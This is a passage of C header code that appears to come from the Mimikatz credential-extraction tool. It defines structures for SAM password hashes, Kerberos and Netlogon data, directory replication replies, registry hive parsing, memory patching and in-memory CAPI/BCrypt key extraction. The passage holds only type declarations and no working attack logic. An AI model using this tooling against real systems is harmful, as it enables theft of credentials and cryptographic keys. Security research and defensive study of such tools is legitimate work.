	/* [size_is] */ PGROUP_MEMBERSHIP ResourceGroupIds;
} KERB_VALIDATION_INFO, * PKERB_VALIDATION_INFO;





typedef struct _SAMPR_LOGON_HOURS {
	unsigned short UnitsPerWeek;
	unsigned char* LogonHours;
} SAMPR_LOGON_HOURS, * PSAMPR_LOGON_HOURS;

typedef struct _SAMPR_USER_INTERNAL1_INFORMATION {
	BYTE NTHash[LM_NTLM_HASH_LENGTH];
	BYTE LMHash[LM_NTLM_HASH_LENGTH];
	BYTE NtPasswordPresent;
	BYTE LmPasswordPresent;
	BYTE PasswordExpired;
	BYTE PrivateDataSensitive;
} SAMPR_USER_INTERNAL1_INFORMATION, * PSAMPR_USER_INTERNAL1_INFORMATION;

typedef struct _SAMPR_USER_ALL_INFORMATION {
	FILETIME LastLogon;
	FILETIME LastLogoff;
	FILETIME PasswordLastSet;
	FILETIME AccountExpires;
	FILETIME PasswordCanChange;
	FILETIME PasswordMustChange;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING FullName;
	LSA_UNICODE_STRING HomeDirectory;
	LSA_UNICODE_STRING HomeDirectoryDrive;
	LSA_UNICODE_STRING ScriptPath;
	LSA_UNICODE_STRING ProfilePath;
	LSA_UNICODE_STRING AdminComment;
	LSA_UNICODE_STRING WorkStations;
	LSA_UNICODE_STRING UserComment;
	LSA_UNICODE_STRING Parameters;
	LSA_UNICODE_STRING LmOwfPassword;
	LSA_UNICODE_STRING NtOwfPassword;
	LSA_UNICODE_STRING PrivateData;
	SAMPR_SR_SECURITY_DESCRIPTOR SecurityDescriptor;
	DWORD UserId;
	DWORD PrimaryGroupId;
	DWORD UserAccountControl;
	DWORD WhichFields;
	SAMPR_LOGON_HOURS LogonHours;
	WORD BadPasswordCount;
	WORD LogonCount;
	WORD CountryCode;
	WORD CodePage;
	BOOLEAN LmPasswordPresent;
	BOOLEAN NtPasswordPresent;
	BOOLEAN PasswordExpired;
	BOOLEAN PrivateDataSensitive;
} SAMPR_USER_ALL_INFORMATION, * PSAMPR_USER_ALL_INFORMATION;

typedef LONGLONG DSTIME;
typedef LONGLONG USN;
typedef ULONG ATTRTYP;
typedef void* DRS_HANDLE;


typedef struct _NT4SID {
	UCHAR Data[28];
} NT4SID;

typedef struct _OID_t {
	unsigned int length;
	BYTE* elements;
} OID_t;

typedef struct _PrefixTableEntry {
	ULONG ndx;
	OID_t prefix;
} PrefixTableEntry;

typedef struct _SCHEMA_PREFIX_TABLE {
	DWORD PrefixCount;
	PrefixTableEntry* pPrefixEntry;
} SCHEMA_PREFIX_TABLE;


typedef struct _PARTIAL_ATTR_VECTOR_V1_EXT {
	DWORD dwVersion;
	DWORD dwReserved1;
	DWORD cAttrs;
	ATTRTYP rgPartialAttr[ANYSIZE_ARRAY];
} PARTIAL_ATTR_VECTOR_V1_EXT;

typedef struct _ATTRVAL {
	ULONG valLen;
	UCHAR* pVal;
} ATTRVAL;

typedef struct _ATTRVALBLOCK {
	ULONG valCount;
	ATTRVAL* pAVal;
} ATTRVALBLOCK;

typedef struct _ATTR {
	ATTRTYP attrTyp;
	ATTRVALBLOCK AttrVal;
} ATTR;

typedef struct _ATTRBLOCK {
	ULONG attrCount;
	ATTR* pAttr;
} ATTRBLOCK;


const wchar_t* KULL_M_REGISTRY_TYPE_WSTRING[];

typedef enum _KULL_M_REGISTRY_TYPE
{
	KULL_M_REGISTRY_TYPE_OWN,
	KULL_M_REGISTRY_TYPE_HIVE,
} KULL_M_REGISTRY_TYPE;


typedef struct _KULL_M_REGISTRY_HIVE_KEY_NAMED
{
	LONG szCell;
	WORD tag;
	WORD flags;
	FILETIME lastModification;
	DWORD unk0;
	LONG offsetParentKey;
	DWORD nbSubKeys;
	DWORD nbVolatileSubKeys;
	LONG offsetSubKeys;
	LONG offsetVolatileSubkeys;
	DWORD nbValues;
	LONG offsetValues;
	LONG offsetSecurityKey;
	LONG offsetClassName;
	DWORD szMaxSubKeyName;
	DWORD szMaxSubKeyClassName;
	DWORD szMaxValueName;
	DWORD szMaxValueData;
	DWORD unk1;
	WORD szKeyName;
	WORD szClassName;
	BYTE keyName[ANYSIZE_ARRAY];
} KULL_M_REGISTRY_HIVE_KEY_NAMED, * PKULL_M_REGISTRY_HIVE_KEY_NAMED;

typedef struct _KULL_M_REGISTRY_HIVE_HANDLE
{
	HANDLE hFileMapping;
	LPVOID pMapViewOfFile;
	PBYTE pStartOf;
	PKULL_M_REGISTRY_HIVE_KEY_NAMED pRootNamedKey;
} KULL_M_REGISTRY_HIVE_HANDLE, * PKULL_M_REGISTRY_HIVE_HANDLE;

typedef struct _KULL_M_REGISTRY_HANDLE {
	KULL_M_REGISTRY_TYPE type;
	union {
		PKULL_M_REGISTRY_HIVE_HANDLE pHandleHive;
	};
} KULL_M_REGISTRY_HANDLE, * PKULL_M_REGISTRY_HANDLE;


typedef wchar_t* LOGONSRV_HANDLE;
typedef struct _NETLOGON_CREDENTIAL {
	CHAR data[8];
} NETLOGON_CREDENTIAL, * PNETLOGON_CREDENTIAL;


typedef  enum _NETLOGON_SECURE_CHANNEL_TYPE {
	NullSecureChannel = 0,
	MsvApSecureChannel = 1,
	WorkstationSecureChannel = 2,
	TrustedDnsDomainSecureChannel = 3,
	TrustedDomainSecureChannel = 4,
	UasServerSecureChannel = 5,
	ServerSecureChannel = 6,
	CdcServerSecureChannel = 7
} NETLOGON_SECURE_CHANNEL_TYPE;


typedef struct _NETLOGON_AUTHENTICATOR {
	NETLOGON_CREDENTIAL Credential;
	DWORD Timestamp;
} NETLOGON_AUTHENTICATOR, * PNETLOGON_AUTHENTICATOR;

typedef struct _NL_TRUST_PASSWORD {
	WCHAR Buffer[256];
	ULONG Length;
} NL_TRUST_PASSWORD, * PNL_TRUST_PASSWORD;


typedef union _SAMPR_USER_INFO_BUFFER {
	SAMPR_USER_INTERNAL1_INFORMATION Internal1;
	SAMPR_USER_ALL_INFORMATION All;
} SAMPR_USER_INFO_BUFFER, * PSAMPR_USER_INFO_BUFFER;



typedef struct _REMOTE_LIB_OUTPUT_DATA {
	PVOID		outputVoid;
	DWORD		outputDword;
	NTSTATUS	outputStatus;
	DWORD		outputSize;
	PVOID		outputData;
} REMOTE_LIB_OUTPUT_DATA, * PREMOTE_LIB_OUTPUT_DATA;

typedef struct _REMOTE_LIB_INPUT_DATA {
	PVOID		inputVoid;
	DWORD		inputDword;
	DWORD		inputSize;
	BYTE		inputData[ANYSIZE_ARRAY];
} REMOTE_LIB_INPUT_DATA, * PREMOTE_LIB_INPUT_DATA;

typedef struct _REMOTE_LIB_DATA {
	REMOTE_LIB_OUTPUT_DATA	output;
	REMOTE_LIB_INPUT_DATA	input;
} REMOTE_LIB_DATA, * PREMOTE_LIB_DATA;


#define PRINTER_NOTIFY_CATEGORY_ALL	0x00010000
#define APD_INSTALL_WARNED_DRIVER	0x00008000

typedef void* PRINTER_HANDLE;

typedef wchar_t* STRING_HANDLE;

typedef struct _DEVMODE_CONTAINER {
	DWORD cbBuf;
	BYTE* pDevMode;
} DEVMODE_CONTAINER;

typedef struct __DRIVER_INFO_2 {
	DWORD cVersion;
	DWORD NameOffset;
	DWORD EnvironmentOffset;
	DWORD DriverPathOffset;
	DWORD DataFileOffset;
	DWORD ConfigFileOffset;
} _DRIVER_INFO_2, * _PDRIVER_INFO_2;

typedef struct _RPC_DRIVER_INFO_3 {
	DWORD cVersion;
	wchar_t* pName;
	wchar_t* pEnvironment;
	wchar_t* pDriverPath;
	wchar_t* pDataFile;
	wchar_t* pConfigFile;
	wchar_t* pHelpFile;
	wchar_t* pMonitorName;
	wchar_t* pDefaultDataType;
	DWORD cchDependentFiles;
	wchar_t* pDependentFiles;
} RPC_DRIVER_INFO_3;

typedef struct _RPC_DRIVER_INFO_4 {
	DWORD cVersion;
	wchar_t* pName;
	wchar_t* pEnvironment;
	wchar_t* pDriverPath;
	wchar_t* pDataFile;
	wchar_t* pConfigFile;
	wchar_t* pHelpFile;
	wchar_t* pMonitorName;
	wchar_t* pDefaultDataType;
	DWORD cchDependentFiles;
	wchar_t* pDependentFiles;
	DWORD cchPreviousNames;
	wchar_t* pszzPreviousNames;
} RPC_DRIVER_INFO_4;

typedef struct _RPC_DRIVER_INFO_6 {
	DWORD cVersion;
	wchar_t* pName;
	wchar_t* pEnvironment;
	wchar_t* pDriverPath;
	wchar_t* pDataFile;
	wchar_t* pConfigFile;
	wchar_t* pHelpFile;
	wchar_t* pMonitorName;
	wchar_t* pDefaultDataType;
	DWORD cchDependentFiles;
	wchar_t* pDependentFiles;
	DWORD cchPreviousNames;
	wchar_t* pszzPreviousNames;
	FILETIME ftDriverDate;
	DWORDLONG dwlDriverVersion;
	wchar_t* pMfgName;
	wchar_t* pOEMUrl;
	wchar_t* pHardwareID;
	wchar_t* pProvider;
} RPC_DRIVER_INFO_6;

typedef struct _RPC_DRIVER_INFO_8 {
	DWORD cVersion;
	wchar_t* pName;
	wchar_t* pEnvironment;
	wchar_t* pDriverPath;
	wchar_t* pDataFile;
	wchar_t* pConfigFile;
	wchar_t* pHelpFile;
	wchar_t* pMonitorName;
	wchar_t* pDefaultDataType;
	DWORD cchDependentFiles;
	wchar_t* pDependentFiles;
	DWORD cchPreviousNames;
	wchar_t* pszzPreviousNames;
	FILETIME ftDriverDate;
	DWORDLONG dwlDriverVersion;
	wchar_t* pMfgName;
	wchar_t* pOEMUrl;
	wchar_t* pHardwareID;
	wchar_t* pProvider;
	wchar_t* pPrintProcessor;
	wchar_t* pVendorSetup;
	DWORD cchColorProfiles;
	wchar_t* pszzColorProfiles;
	wchar_t* pInfPath;
	DWORD dwPrinterDriverAttributes;
	DWORD cchCoreDependencies;
	wchar_t* pszzCoreDriverDependencies;
	FILETIME ftMinInboxDriverVerDate;
	DWORDLONG dwlMinInboxDriverVerVersion;
} RPC_DRIVER_INFO_8;

typedef LONG KPRIORITY;


typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
} VM_COUNTERS;


//typedef struct _IO_COUNTERS {
//	ULONGLONG  ReadOperationCount;
//	ULONGLONG  WriteOperationCount;
//	ULONGLONG  OtherOperationCount;
//	ULONGLONG ReadTransferCount;
//	ULONGLONG WriteTransferCount;
//	ULONGLONG OtherTransferCount;
//} IO_COUNTERS;

typedef struct _CLIENT_ID {
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef enum _KWAIT_REASON {
	Executive,
	FreePage,
	PageIn,
	PoolAllocation,
	DelayExecution,
	Suspended,
	UserRequest,
	WrExecutive,
	WrFreePage,
	WrPageIn,
	WrPoolAllocation,
	WrDelayExecution,
	WrSuspended,
	WrUserRequest,
	WrEventPair,
	WrQueue,
	WrLpcReceive,
	WrLpcReply,
	WrVirtualMemory,
	WrPageOut,
	WrRendezvous,
	WrKeyedEvent,
	WrTerminated,
	WrProcessInSwap,
	WrCpuRateControl,
	WrCalloutStack,
	WrKernel,
	WrResource,
	WrPushLock,
	WrMutex,
	WrQuantumEnd,
	WrDispatchInt,
	WrPreempted,
	WrYieldExecution,
	WrFastMutex,
	WrGuardedMutex,
	WrRundown,
	MaximumWaitReason
} KWAIT_REASON;




typedef struct _SYSTEM_THREAD {
#if !defined(_M_X64) || !defined(_M_ARM64) // TODO:ARM64
	LARGE_INTEGER KernelTime;
#endif
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitchCount;
	ULONG State;
	KWAIT_REASON WaitReason;
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
	LARGE_INTEGER unk;
#endif
} SYSTEM_THREAD, * PSYSTEM_THREAD;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER Reserved[3];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE ParentProcessId;
	ULONG HandleCount;
	LPCWSTR Reserved2[2];
	ULONG PrivatePageCount;
	VM_COUNTERS VirtualMemoryCounters;
	IO_COUNTERS IoCounters;
	SYSTEM_THREAD Threads[ANYSIZE_ARRAY];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;


typedef struct _KULL_M_PROCESS_EXPORTED_ENTRY {
	WORD	machine;
	DWORD	ordinal;
	DWORD	hint;
	PSTR	name;
	PSTR	redirect;
	KULL_M_MEMORY_ADDRESS	pRva;
	KULL_M_MEMORY_ADDRESS	function;
} KULL_M_PROCESS_EXPORTED_ENTRY, * PKULL_M_PROCESS_EXPORTED_ENTRY;

typedef BOOL(CALLBACK* PKULL_M_MODULE_ENUM_CALLBACK) (PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);

typedef struct _KULL_M_PROCESS_IMPORTED_ENTRY {
	WORD	machine;
	PSTR	libname;
	DWORD	ordinal;
	PSTR	name;
	KULL_M_MEMORY_ADDRESS	pFunction;
	KULL_M_MEMORY_ADDRESS	function;
} KULL_M_PROCESS_IMPORTED_ENTRY, * PKULL_M_PROCESS_IMPORTED_ENTRY;
typedef BOOL(CALLBACK* PKULL_M_IMPORTED_ENTRY_ENUM_CALLBACK) (PKULL_M_PROCESS_IMPORTED_ENTRY pImportedEntryInformations, PVOID pvArg);


#pragma pack(push, 1)
typedef struct _KULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE {
	DWORD id;
	DWORD unk0; // maybe flags
	DWORD unk1; // maybe type
	DWORD unk2; // 0a 00 00 00
	//DWORD unkComplex; // only in complex (and 0, avoid it ?)
	DWORD szData; // when parsing, inc bullshit... clean in structure
	PBYTE data;
	DWORD szIV;
	PBYTE IV;
} KULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE, * PKULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE;
#pragma pack(pop)


typedef struct _KULL_M_PATCH_OFFSETS {
	LONG off0;
#if defined(_M_ARM64)
	LONG armOff0;
#endif
	LONG off1;
#if defined(_M_ARM64)
	LONG armOff1;
#endif
	LONG off2;
#if defined(_M_ARM64)
	LONG armOff2;
#endif
	LONG off3;
#if defined(_M_ARM64)
	LONG armOff3;
#endif
	LONG off4;
#if defined(_M_ARM64)
	LONG armOff4;
#endif
	LONG off5;
#if defined(_M_ARM64)
	LONG armOff5;
#endif
	LONG off6;
#if defined(_M_ARM64)
	LONG armOff6;
#endif
	LONG off7;
#if defined(_M_ARM64)
	LONG armOff7;
#endif
	LONG off8;
#if defined(_M_ARM64)
	LONG armOff8;
#endif
	LONG off9;
#if defined(_M_ARM64)
	LONG armOff9;
#endif
} KULL_M_PATCH_OFFSETS, * PKULL_M_PATCH_OFFSETS;

typedef NTSTATUS(*PKULL_M_PATCH_CALLBACK) (int argc, wchar_t* args[]);

typedef struct _KULL_M_PATCH_PATTERN {
	DWORD Length;
	BYTE* Pattern;
} KULL_M_PATCH_PATTERN, * PKULL_M_PATCH_PATTERN;

typedef struct _KULL_M_PATCH_GENERIC {
	DWORD MinBuildNumber;
	KULL_M_PATCH_PATTERN Search;
	KULL_M_PATCH_PATTERN Patch;
	KULL_M_PATCH_OFFSETS Offsets;
} KULL_M_PATCH_GENERIC, * PKULL_M_PATCH_GENERIC;


typedef struct _PROPERTY_META_DATA_EXT {
	DWORD dwVersion;
	DSTIME timeChanged;
	UUID uuidDsaOriginating;
	USN usnOriginating;
} PROPERTY_META_DATA_EXT;

typedef struct _PROPERTY_META_DATA_EXT_VECTOR {
	DWORD cNumProps;
	PROPERTY_META_DATA_EXT rgMetaData[ANYSIZE_ARRAY];
} PROPERTY_META_DATA_EXT_VECTOR;

typedef struct _DSNAME {
	ULONG structLen;
	ULONG SidLen;
	GUID Guid;
	NT4SID Sid;
	ULONG NameLen;
	WCHAR StringName[ANYSIZE_ARRAY];
} DSNAME;

typedef struct _ENTINF {
	DSNAME* pName;
	ULONG ulFlags;
	ATTRBLOCK AttrBlock;
} ENTINF;

typedef struct _REPLENTINFLIST {
	struct _REPLENTINFLIST* pNextEntInf;
	ENTINF Entinf;
	BOOL fIsNCPrefix;
	UUID* pParentGuid;
	PROPERTY_META_DATA_EXT_VECTOR* pMetaDataExt;
} REPLENTINFLIST;

typedef struct _UPTODATE_CURSOR_V2 {
	UUID uuidDsa;
	USN usnHighPropUpdate;
	DSTIME timeLastSyncSuccess;
} UPTODATE_CURSOR_V2;

typedef struct _DS_DOMAIN_CONTROLLER_INFO_2W {
	WCHAR* NetbiosName;
	WCHAR* DnsHostName;
	WCHAR* SiteName;
	WCHAR* SiteObjectName;
	WCHAR* ComputerObjectName;
	WCHAR* ServerObjectName;
	WCHAR* NtdsDsaObjectName;
	BOOL fIsPdc;
	BOOL fDsEnabled;
	BOOL fIsGc;
	GUID SiteObjectGuid;
	GUID ComputerObjectGuid;
	GUID ServerObjectGuid;
	GUID NtdsDsaObjectGuid;
} DS_DOMAIN_CONTROLLER_INFO_2W;


typedef struct _DRS_MSG_DCINFOREPLY_V2 {
	DWORD cItems;
	DS_DOMAIN_CONTROLLER_INFO_2W* rItems;
} DRS_MSG_DCINFOREPLY_V2;

typedef union _DRS_MSG_DCINFOREPLY {
	DRS_MSG_DCINFOREPLY_V2 V2;
} DRS_MSG_DCINFOREPLY;


typedef struct _DS_NAME_RESULT_ITEMW {
	DWORD status;
	WCHAR* pDomain;
	WCHAR* pName;
} DS_NAME_RESULT_ITEMW, * PDS_NAME_RESULT_ITEMW;

typedef struct _DS_NAME_RESULTW {
	DWORD cItems;
	PDS_NAME_RESULT_ITEMW rItems;
} DS_NAME_RESULTW, * PDS_NAME_RESULTW;

typedef struct _DRS_MSG_CRACKREPLY_V1 {
	DS_NAME_RESULTW* pResult;
} DRS_MSG_CRACKREPLY_V1;

typedef union _DRS_MSG_CRACKREPLY {
	DRS_MSG_CRACKREPLY_V1 V1;
} DRS_MSG_CRACKREPLY;

typedef struct _USN_VECTOR {
	USN usnHighObjUpdate;
	USN usnReserved;
	USN usnHighPropUpdate;
} USN_VECTOR;

typedef struct _UPTODATE_VECTOR_V2_EXT {
	DWORD dwVersion;
	DWORD dwReserved1;
	DWORD cNumCursors;
	DWORD dwReserved2;
	UPTODATE_CURSOR_V2 rgCursors[ANYSIZE_ARRAY];
} UPTODATE_VECTOR_V2_EXT;

typedef struct _VALUE_META_DATA_EXT_V1 {
	DSTIME timeCreated;
	PROPERTY_META_DATA_EXT MetaData;
} VALUE_META_DATA_EXT_V1;

typedef struct _REPLVALINF_V1 {
	DSNAME* pObject;
	ATTRTYP attrTyp;
	ATTRVAL Aval;
	BOOL fIsPresent;
	VALUE_META_DATA_EXT_V1 MetaData;
} REPLVALINF_V1;

typedef struct _DRS_MSG_GETCHGREPLY_V6 {
	UUID uuidDsaObjSrc;
	UUID uuidInvocIdSrc;
	DSNAME* pNC;
	USN_VECTOR usnvecFrom;
	USN_VECTOR usnvecTo;
	UPTODATE_VECTOR_V2_EXT* pUpToDateVecSrc;
	SCHEMA_PREFIX_TABLE PrefixTableSrc;
	ULONG ulExtendedRet;
	ULONG cNumObjects;
	ULONG cNumBytes;
	REPLENTINFLIST* pObjects;
	BOOL fMoreData;
	ULONG cNumNcSizeObjects;
	ULONG cNumNcSizeValues;
	DWORD cNumValues;
	REPLVALINF_V1* rgValues;
	DWORD dwDRSError;
} DRS_MSG_GETCHGREPLY_V6;

typedef union _DRS_MSG_GETCHGREPLY {
	DRS_MSG_GETCHGREPLY_V6 V6;
} DRS_MSG_GETCHGREPLY;




typedef struct _MIMI_PUBLICKEY {
	ALG_ID sessionType;
	DWORD cbPublicKey;
	BYTE* pbPublicKey;
} MIMI_PUBLICKEY, * PMIMI_PUBLICKEY;


typedef struct _DRIVER_CONTAINER {
	DWORD Level;
	union {
		DRIVER_INFO_1* pNotUsed;
		DRIVER_INFO_2* Level2;
		RPC_DRIVER_INFO_3* Level3;
		RPC_DRIVER_INFO_4* Level4;
		RPC_DRIVER_INFO_6* Level6;
		RPC_DRIVER_INFO_8* Level8;
	} DriverInfo;
} DRIVER_CONTAINER;


typedef struct _HIDD_ATTRIBUTES {
	ULONG   Size;
	USHORT  VendorID;
	USHORT  ProductID;
	USHORT  VersionNumber;
} HIDD_ATTRIBUTES, * PHIDD_ATTRIBUTES;


typedef struct _HIDP_PREPARSED_DATA* PHIDP_PREPARSED_DATA;

typedef USHORT USAGE, * PUSAGE;
typedef struct _HIDP_CAPS
{
	USAGE    Usage;
	USAGE    UsagePage;
	USHORT   InputReportByteLength;
	USHORT   OutputReportByteLength;
	USHORT   FeatureReportByteLength;
	USHORT   Reserved[17];

	USHORT   NumberLinkCollectionNodes;

	USHORT   NumberInputButtonCaps;
	USHORT   NumberInputValueCaps;
	USHORT   NumberInputDataIndices;

	USHORT   NumberOutputButtonCaps;
	USHORT   NumberOutputValueCaps;
	USHORT   NumberOutputDataIndices;

	USHORT   NumberFeatureButtonCaps;
	USHORT   NumberFeatureValueCaps;
	USHORT   NumberFeatureDataIndices;
} HIDP_CAPS, * PHIDP_CAPS;


typedef struct _KULL_M_REGISTRY_HIVE_BIN_CELL
{
	LONG szCell;
	union {
		WORD tag;
		BYTE data[ANYSIZE_ARRAY];
	};
} KULL_M_REGISTRY_HIVE_BIN_CELL, * PKULL_M_REGISTRY_HIVE_BIN_CELL;


typedef struct _KULL_M_REGISTRY_HIVE_VALUE_KEY
{
	LONG szCell;
	WORD tag;
	WORD szValueName;
	DWORD szData;
	LONG offsetData;
	DWORD typeData;
	WORD flags;
	WORD __align;
	BYTE valueName[ANYSIZE_ARRAY];
} KULL_M_REGISTRY_HIVE_VALUE_KEY, * PKULL_M_REGISTRY_HIVE_VALUE_KEY;



////////////////////////////////////////////////////////////////
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m.h"
//#include "../../../modules/kull_m_crypto.h"
//#include "../../../modules/kull_m_memory.h"
//#include "../../../modules/kull_m_process.h"

void kuhl_m_crypto_extractor_capi32(PKULL_M_MEMORY_ADDRESS address);
void kuhl_m_crypto_extractor_bcrypt32(PKULL_M_MEMORY_ADDRESS address);
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
void kuhl_m_crypto_extractor_capi64(PKULL_M_MEMORY_ADDRESS address);
void kuhl_m_crypto_extractor_bcrypt64(PKULL_M_MEMORY_ADDRESS address);
#endif

DWORD kuhl_m_crypto_extractor_GetKeySizeForEncryptMemory(DWORD size);
DWORD kuhl_m_crypto_extractor_GetKeySize(DWORD bits);

NTSTATUS kuhl_m_crypto_extract(int argc, wchar_t * argv[]);

typedef struct _KIWI_CRYPTPROV {
	PVOID CPAcquireContext;
	PVOID CPReleaseContext;
	PVOID CPGenKey;
	PVOID CPDeriveKey;
	PVOID CPDestroyKey;
	PVOID CPSetKeyParam;
	PVOID CPGetKeyParam;
	PVOID CPExportKey;
	PVOID CPImportKey;
	PVOID CPEncrypt;
	PVOID CPDecrypt;
	PVOID CPCreateHash;
	PVOID CPHashData;
	PVOID CPHashSessionKey;
	PVOID CPDestroyHash;
	PVOID CPSignHash;
	PVOID CPVerifySignature;
	PVOID CPGenRandom;
	PVOID CPGetUserKey;
	PVOID CPSetProvParam;
	PVOID CPGetProvParam;
	PVOID CPSetHashParam;
	PVOID CPGetHashParam;
	PVOID unk0;
	PVOID CPDuplicateKey;
	PVOID CPDuplicateHash;
	PVOID unk1;
	PVOID ImageBase;
	PVOID obfUnk2;
} KIWI_CRYPTPROV, *PKIWI_CRYPTPROV;

typedef struct _KIWI_BCRYPT_GENERIC_KEY_HEADER {
	DWORD size;
	DWORD tag;	// 'MS*'
	DWORD type;
} KIWI_BCRYPT_GENERIC_KEY_HEADER, *PKIWI_BCRYPT_GENERIC_KEY_HEADER;

typedef struct _KIWI_BCRYPT_BIGNUM_Header {
	DWORD tag; // 6D4D0040h or 6D4D0000h for complex type, 67490000h for Int, 67440000h for Div (?)
	DWORD unkLen0; // (# of 16 bytes block?)
	DWORD size; // including this struct
	DWORD unk0; // align ?
} KIWI_BCRYPT_BIGNUM_Header, *PKIWI_BCRYPT_BIGNUM_Header;

typedef struct _KIWI_BCRYPT_BIGNUM_Div {
	KIWI_BCRYPT_BIGNUM_Header Header;
	DWORD unk0; // 0
	DWORD unk1; // 0
	DWORD unk2; // 6B41BC89h vary
	DWORD unk3; // 0
	KIWI_BCRYPT_BIGNUM_Header bn;
} KIWI_BCRYPT_BIGNUM_Div, *PKIWI_BCRYPT_BIGNUM_Div;

typedef struct _KIWI_PRIV_STRUCT_32 {
	DWORD32 strangeStruct;
	//DWORD unk0; // 0	// inconsitent between versions
	//DWORD unk1; // 0x20002
	//DWORD unk2; // 0x80119
	//DWORD32 rawKey;
	//DWORD unk3; // 4
	//DWORD unk4; // 0x2000e
	//DWORD unk5; // 0x8011b
} KIWI_PRIV_STRUCT_32, *PKIWI_PRIV_STRUCT_32;

typedef struct _KIWI_RAWKEY32 {
	DWORD32 obfUnk0; // 0E380D2CC
	ALG_ID Algid;
	DWORD Flags; // ? 1
	DWORD dwData; // size (0x10) ?
	// align on x64
	DWORD32 Data;
	DWORD unk0; // ? 1
	DWORD unk1;
	DWORD32 unk2; //
	DWORD unk3;
	BYTE IV[32];
	DWORD unk4;
	DWORD dwSalt;
	BYTE Salt[24];
	DWORD unk5; // ? 1
	DWORD dwMode;
	DWORD dwModeBits;
	DWORD dwPermissions;
	DWORD dwEffectiveKeyLen;
	DWORD32 OaepParamsLen;
	DWORD dwOaepParamsLen;
	DWORD dwBlockLen;
} KIWI_RAWKEY32, *PKIWI_RAWKEY32;

typedef struct _KIWI_RAWKEY_51_32 { // :(
	DWORD32 obfUnk0; // 0E380D2CC
	ALG_ID Algid;
	DWORD Flags; // ? 1
	DWORD dwData; // size (0x10) ?
	// align on x64
	DWORD32 Data;
	DWORD unk1;
	DWORD unk3;
	BYTE IV[32];
	DWORD unk4;
	DWORD dwSalt;
	BYTE Salt[24];
	DWORD unk5; // ? 1
	DWORD dwMode;
	DWORD dwModeBits;
	DWORD dwPermissions;
	DWORD dwEffectiveKeyLen;
	DWORD32 OaepParamsLen;
	DWORD dwOaepParamsLen;
	DWORD dwBlockLen;
} KIWI_RAWKEY_51_32, *PKIWI_RAWKEY_51_32;

typedef struct _KIWI_UNK_INT_KEY32 {
	DWORD32 /*PKIWI_RAWKEY */KiwiRawKey;
	DWORD unk0; // 2
} KIWI_UNK_INT_KEY32, *PKIWI_UNK_INT_KEY32;

typedef struct _KIWI_CRYPTKEY32 {
	DWORD32 CPGenKey;
	DWORD32 CPDeriveKey;
	DWORD32 CPDestroyKey;
	DWORD32 CPSetKeyParam;
	DWORD32 CPGetKeyParam;
	DWORD32 CPExportKey;
	DWORD32 CPImportKey;
	DWORD32 CPEncrypt;
	DWORD32 CPDecrypt;
	DWORD32 CPDuplicateKey;
	DWORD32 /*PKIWI_CRYPTPROV */KiwiProv;
	DWORD32 /*PKIWI_UNK_INT_KEY */obfKiwiIntKey;
} KIWI_CRYPTKEY32, *PKIWI_CRYPTKEY32;


typedef struct _KIWI_BCRYPT_BIGNUM_Int32 {
	KIWI_BCRYPT_BIGNUM_Header Header;
	BYTE data[ANYSIZE_ARRAY];
} KIWI_BCRYPT_BIGNUM_Int32, *PKIWI_BCRYPT_BIGNUM_Int32;

typedef struct _KIWI_BCRYPT_BIGNUM_ComplexType32 {
	KIWI_BCRYPT_BIGNUM_Header Header;
	DWORD unkLenFlags0; // 0x80
	DWORD unk0; // 0
	BYTE unkArray0[8]; // 8Bh,9Ch,87h,0B9h,12h,68h,84h,7Fh vary
	DWORD32 unkDataAfter;
	DWORD unk1; // 0
	DWORD unk2; // 0
	DWORD unk3; // 0
	KIWI_BCRYPT_BIGNUM_Header bn;
} KIWI_BCRYPT_BIGNUM_ComplexType32, *PKIWI_BCRYPT_BIGNUM_ComplexType32;

typedef struct _KIWI_BCRYPT_ASYM_KEY_DATA_10_32 {
	DWORD size; // 3552
	DWORD unk0; // 1
	DWORD len0; // 2048
	DWORD len1; // 2048
	DWORD unk1; // 0x10
	DWORD unk2; // 1
	DWORD unk3; // 0x11
	DWORD unk4; // 1
	DWORD unk5; // 2
	DWORD len2; // 1024
	DWORD len3; // 1024
	DWORD unk6;	// 8
	DWORD unk7;	// 8
	DWORD unk8;	// 8
	DWORD32 Prime1; // C
	DWORD32 Prime2; // C
	DWORD32 unkArray0;
	DWORD32 unkArray1;
	DWORD32 PublicExponent;
	DWORD32 PrivateExponent;
	DWORD32 Exponent1;
	DWORD32 Exponent2;
	DWORD32 Modulus; // C
	DWORD32 _Prime1; // C
	DWORD32 _Prime2; // C
	DWORD32 _unkArray0;
	DWORD32 _unkArray1;
	DWORD32 _PublicExponent;
	DWORD32 _PrivateExponent;
	DWORD32 _Exponent1;
	DWORD32 _Exponent2;
	DWORD32 unk9; // 0 maybe align with data just after...
} KIWI_BCRYPT_ASYM_KEY_DATA_10_32, *PKIWI_BCRYPT_ASYM_KEY_DATA_10_32;

